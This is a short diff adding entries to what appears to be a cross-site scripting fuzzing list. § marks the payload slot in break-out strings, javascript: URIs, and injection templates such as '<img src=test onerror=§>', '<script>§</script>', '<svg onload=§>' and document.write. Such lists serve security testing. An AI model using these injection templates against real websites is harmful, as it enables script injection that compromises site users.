@@ -1,23 +1,32 @@
 ﻿§
  §
 §;
+§)
+§/>
+§>
 §//
 ;§
 >§
 />§
 '§
 '§'
+;'§'
 '>§'
 '/>§'
 '§;'
 "§
 "§"
+;"§"
+;'"§"'
+;"'"§'"
 ">§"
 "/>§"
 "§;"
 javascript:§
+javascript:§;
 <img src=test onerror=§>
 <script>§</script>
 ><script>§</script><!--
 /><script>§</script><!--
 <svg onload=§>
+document.write('§')
